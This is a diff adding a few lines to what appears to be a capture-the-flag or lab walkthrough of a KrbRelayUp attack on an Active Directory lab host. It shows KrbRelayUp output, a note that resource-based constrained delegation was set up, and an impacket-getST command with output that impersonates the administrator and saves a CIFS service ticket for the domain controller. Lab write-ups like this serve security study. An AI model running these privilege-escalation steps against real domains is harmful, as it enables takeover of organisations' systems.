@@ -451,4 +451,23 @@ KrbRelayUp - Relaying you to SYSTEM
 [+] LUID            : 0x685960
 [+] System service should be started in background
 ```
+This has set up the RBCD
 
+```python
+impacket-getST -impersonate 'administrator' \
+  -spn 'cifs/BRUNODC.bruno.vl' \
+  -dc-ip 10.129.11.177 \
+  'bruno.vl/KRBRELAYUP$:pK2=fZ5=yQ6@bK0@'
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in administrator@cifs_BRUNODC.bruno.vl@BRUNO.VL.ccache
+```
+
+```python
+
+```
